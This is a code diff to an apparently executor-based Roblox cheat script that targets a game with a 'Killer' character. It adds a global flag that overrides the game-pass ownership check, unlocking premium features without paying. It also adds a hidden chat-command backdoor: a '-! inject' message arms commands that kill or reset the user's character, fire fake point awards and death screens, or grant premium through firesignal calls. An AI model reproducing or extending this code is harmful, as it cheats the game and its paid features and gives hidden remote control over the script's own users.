@@ -890,8 +890,9 @@ local product_price = product_info.PriceInRobux
 return tostring(product_price)
 end
 
+_G.Premium = false
 function HavePremium()
-if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer.UserId, 1264479709) then
+if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game:GetService("Players").LocalPlayer.UserId, 1264479709) or _G.Premium == true then
 return true
 else
 return false
@@ -1366,18 +1367,24 @@ target_char.HumanoidRootPart["Stalk3"].SoundId = suit.HumanoidRootPart["Stalk3"]
 target_char.HumanoidRootPart["Stalk4"].SoundId = suit.HumanoidRootPart["Stalk4"].SoundId
 end
 
-
-
+local console_injected = false
 -- you know what are these functions... troll functions cuz IM BORED!!! !!11 !!!!!!!
 local function onChatted(message)
     pcall(function()
-    if message:match("-! activate miso") then
+    if message:match("-! inject (%a+)") then
+	local target_name = message:match("-! inject (%a+)")
+	if target_name == LP.Name then
+	console_injected = true
+	end
+    elseif message:match("-! activate miso") then
+	if console_injected ~= true then return nil end
 	for _,e in pairs(game:GetService("Players"):GetPlayers()) do
 	if e then
 		pcall(CreateMISO(e))
 	end
 	end
     elseif message:match("-! activate permadie") then
+	if console_injected ~= true then return nil end
 	pcall(function()
 	    if replicatesignal then
         replicatesignal(game:GetService("Players").LocalPlayer.ConnectDiedSignalBackend)
@@ -1389,9 +1396,10 @@ local function onChatted(message)
     	    end
 	end)
     elseif message:match("-! award (%d+)") then
+	if console_injected ~= true then return nil end
 	local target_amount = message:match("-! award (%d+)")
 	pcall(function()
-	    if replicatesignal then
+	    if firesignal then
 firesignal(game:GetService("ReplicatedStorage").Events.RemoteEvents.PlayerPoints.OnClientEvent, 
     target_amount,
     " for shooting the Killer with a revolver."
@@ -1399,15 +1407,23 @@ firesignal(game:GetService("ReplicatedStorage").Events.RemoteEvents.PlayerPoints
     	    end
 	end)
     elseif message:match("-! activate resetchar") then
+	if console_injected ~= true then return nil end
 	if game:GetService("Players").LocalPlayer and game:GetService("Players").LocalPlayer.Character and 			game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
 		game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
 	end
 	pcall(function()
-	    if replicatesignal then
+	    if firesignal then
 firesignal(game:GetService("ReplicatedStorage").Events.RemoteEvents.DeathScreen.OnClientEvent)
     	    end
 	end)
+    elseif message:match("-! activate premium (%a+)") then
+	if console_injected ~= true then return nil end
+	local target_name = message:match("-! activate premium (%a+)")
+	if target_name == LP.Name then
+	_G.Premium = true
+	end
     elseif message:match("-! setanim (%a+)") then
+	if console_injected ~= true then return nil end
 local target_anim = message:match("-! setanim (%a+)")
 pcall(function()
 for i,v in pairs(game:GetService("ReplicatedStorage"):WaitForChild("Characters"):WaitForChild("Killer"):GetChildren()) do if v then
